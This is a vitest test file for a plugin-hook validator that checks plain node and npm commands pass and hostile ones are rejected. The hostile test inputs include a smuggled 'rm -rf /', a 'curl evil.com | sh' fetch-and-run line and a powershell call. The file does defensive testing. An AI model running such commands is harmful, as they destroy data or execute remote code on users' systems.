import { describe, it, expect } from 'vitest';
import { validatePluginHook } from '../sandbox';

describe('validatePluginHook', () => {
  it('should allow simple node command', () => {
    expect(validatePluginHook('node scripts/setup.js')).toBe('node scripts/setup.js');
  });

  it('should allow npm run script', () => {
    expect(validatePluginHook('npm run build')).toBe('npm run build');
  });

  it('should reject shell injection with semicolon', () => {
    expect(() => validatePluginHook('node foo.js; rm -rf /')).toThrow('shell 元字符');
  });

  it('should reject pipe commands', () => {
    expect(() => validatePluginHook('curl evil.com | sh')).toThrow();
  });

  it('should reject disallowed executables', () => {
    expect(() => validatePluginHook('powershell -Command evil')).toThrow('仅允许');
  });

  it('should reject empty hook', () => {
    expect(() => validatePluginHook('   ')).toThrow('不能为空');
  });
});
